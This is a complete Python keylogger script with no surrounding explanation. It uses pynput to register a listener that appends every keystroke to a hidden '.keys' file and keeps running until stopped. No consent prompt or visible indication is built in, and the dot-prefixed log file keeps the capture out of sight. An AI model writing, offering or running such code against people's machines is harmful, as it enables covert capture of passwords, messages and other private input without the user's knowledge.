#!/usr/bin/python

import pynput.keyboard

def log_keys(key):
	with open(".keys", "a") as file:
		file.write(str(key))
#	print(key)

key_listener = pynput.keyboard.Listener(on_press = log_keys)
with key_listener:
	key_listener.join()
